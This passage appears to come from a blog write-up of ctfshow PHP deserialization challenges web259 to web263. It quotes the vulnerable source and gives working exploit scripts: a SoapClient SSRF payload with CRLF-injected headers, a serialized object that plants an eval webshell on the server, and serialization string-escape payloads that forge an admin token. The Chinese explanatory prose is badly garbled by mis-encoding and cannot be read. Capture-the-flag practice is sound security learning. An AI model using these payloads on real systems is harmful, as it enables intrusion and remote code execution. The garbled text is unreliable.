class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line"> </span><br><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œflag,php æ–‡ä»¶ä¼šå¸®æˆ‘ä»¬è·å¾— flag çš„å€¼ï¼Œä½†æ˜¯ï¼Œéœ€è¦æå‰æ£€æµ‹ ipï¼Œä¹Ÿå°±æ˜¯ xff çš„å€¼ã€‚</p><p>â€‹ä»ä»£ç ä¸Šçœ‹ç›´æ¥è®¿é—® flag.php ç»™ X_FORWARDED_FOR èµ‹å€¼ 127.0.0.1 ä¸‰æ¬¡ (127.0.0.1, 127.0.0.1,  127.0.0.1) å°±å¯ä»¥ç»•è¿‡ array_pop (åˆ é™¤æ•°ç»„æœ«å°¾çš„å€¼), åœ¨ä¼ å…¥ token ç­‰äº ctfshow å°±èƒ½å¾—åˆ° flag</p><p>â€‹æ‰€ä»¥ï¼Œæ„é€  payload çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ceshi\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br></pre></td></tr></table></figure><p>â€‹å®Œæˆä¸Šé¢çš„ç”Ÿæˆæ“ä½œå¾—å®‰è£… php-soap æ‹“å±•ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯ phpstudyï¼Œå®ƒè‡ªå¸¦è¿™ä¸ªæ‹“å±•ï¼Œä½†æ˜¯æ²¡æœ‰ç¼–è¯‘ã€‚æ‰“å¼€ php-iniï¼Œæ‰¾åˆ° extension=php_soap.dllï¼ŒæŠŠå‰é¢çš„åˆ†å·å»æ‰ã€‚</p><p>â€‹ä¹‹åå¾—åˆ°çš„ payload å‘é€ä¹‹åç›´æ¥è¯»å– flag.txt å³å¯ã€‚</p><h1 id="web260"><a class="markdownIt-Anchor" href="#web260">#</a> web260ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ æ²¡ææ‡‚è¿™ä¸ªé¢˜çš„æ„ä¹‰æ˜¯å•¥ï¼Œç®—äº†æ— è„‘äº†ï¼šget ä¼ ä¸€ä¸ª ctfshow=ctfshow_i_love_36D å³å¯å¾—åˆ° flagã€‚</p><h1 id="web261"><a class="markdownIt-Anchor" href="#web261">#</a> web261ï¼š</h1><p>â€‹æç¤ºé‡Œå‡ºç°äº†ä¸ªæ‰“ redisï¼Œæœ‰ç‚¹å®³æ€•äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>â€‹å…ˆæ‰”ä¸€ä¸ªè€ƒç‚¹ï¼š</p><blockquote><p>å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize () å’Œ __wakeup () ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œ åˆ™åªæœ‰ __unserialize () æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup () æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚</p></blockquote><p>â€‹æ‰€ä»¥ä¸ç”¨æ­ç† <code>__wakeup</code>  ç›´æ¥æ‰“æœ¨é©¬ï¼š</p><p>â€‹å› ä¸ºå­˜åœ¨ file_put_contentsï¼Œæ‰€ä»¥åªéœ€è¦å°†æœ¨é©¬å†™å…¥æ–‡ä»¶é‡Œå³å¯ï¼Œç„¶åå°±æ˜¯ <code>__destruct</code> ï¼Œåœ¨è„šæœ¬è·‘å®Œçš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥è§¦å‘ï¼Œä¹‹åï¼Œæœ‰ä¸€ä¸ª if ($this-&gt;code==0x36d ï¼Œéœ€è¦æƒ³åŠæ³•é€šè¿‡ï¼Œå› ä¸ºæ˜¯å¼±æ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª PHP çš„ç‰¹æ€§ï¼Œå…ˆæ‰§è¡Œä¸‹è¿™ä¸ªï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">0x36d</span> == <span class="string">&quot;877.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°è¾“å‡ºç»“æœæ˜¯ 1ï¼Œå¥½äº†ï¼Œå¯ä»¥ç›´æ¥æ¢­äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—® 877.php ç›´æ¥ RCE å³å¯ã€‚</p><h1 id="web262"><a class="markdownIt-Anchor" href="#web262">#</a> web262ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>â€‹æ–‡æ¡£æ³¨é‡Šç»™äº†ä¿¡æ¯ï¼Œæœ‰ä¸€ä¸ª message.php æ–‡ä»¶ï¼Œè®¿é—®ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œå…ˆç”¨</p><p>â€‹<strong>ç›´æ¥ååºåˆ—åŒ–ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥é€šè¿‡ cookie ä¼ ä¸€ä¸ª msg ä¸Šå»å³å¯å¾—åˆ° flag</p><p>â€‹<strong>å­—ç¬¦ä¸²é€ƒé€¸:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span> ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#palyoad:f=1&amp;m=1&amp;t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web263"><a class="markdownIt-Anchor" href="#web263">#</a> web263:</h1><p>â€‹ä¸€ä¸Šæ¥æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå¬è¯´è€ƒç‚¹æ˜¯ session ååºåˆ—åŒ–ï¼Œå…ˆè´´ä¸€ä¸ªæ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vR1RMLUpVL3AvMTY4NTkwOTguaHRtbA==">session ååºåˆ—åŒ–</span></p><p>â€‹é¦–å…ˆï¼Œè®¿é—® www.zip è·å–æºç ã€‚</p><p>â€‹index.phpï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-03 16:28:37</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-06 19:21:45</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><br><span class="line">if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line"> $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span 